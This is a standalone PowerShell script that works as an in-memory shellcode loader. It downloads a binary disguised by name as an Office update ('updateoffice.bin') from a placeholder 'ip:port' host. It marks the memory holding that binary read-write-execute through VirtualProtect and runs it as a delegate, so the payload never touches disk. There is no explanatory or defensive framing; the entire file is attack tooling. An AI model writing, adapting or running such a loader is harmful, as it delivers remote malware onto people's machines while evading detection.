$webclient = New-Object System.Net.WebClient
$bytes = $webclient.DownloadData("http://ip:port/updateoffice.bin")

$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)

$oldProtect = 0
$VirtualProtect = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, ref uint lpflOldProtect);
"@ -Name "Win32" -Namespace "Win32Functions" -PassThru

[Win32Functions.Win32]::VirtualProtect($ptr, $bytes.Length, 0x40, [ref]$oldProtect)

$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, (New-Object System.Func[Void]))
$delegate.Invoke()